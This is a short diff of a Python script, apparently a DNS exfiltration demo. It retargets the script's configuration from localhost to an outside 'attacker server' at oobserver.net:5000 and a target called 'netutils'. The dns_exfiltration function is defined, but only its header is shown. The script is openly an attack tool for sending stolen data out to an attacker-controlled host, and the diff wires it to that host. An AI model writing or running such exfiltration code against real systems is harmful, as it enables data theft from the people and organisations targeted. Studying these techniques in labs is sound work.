@@ -3,8 +3,8 @@ import subprocess
 import dns.resolver
 
 # Configuration
-DEMO_WEBSITE_URL = "http://your-demo-website.com"
-ATTACKER_SERVER_URL = "http://localhost:5000"  # Update this URL to point to your Flask server
+DEMO_WEBSITE_URL = "http://netutils"
+ATTACKER_SERVER_URL = "http://oobserver.net:5000"  # Update this URL to point to your Flask server
 
 def dns_exfiltration(data):
     """Perform DNS exfiltration."""
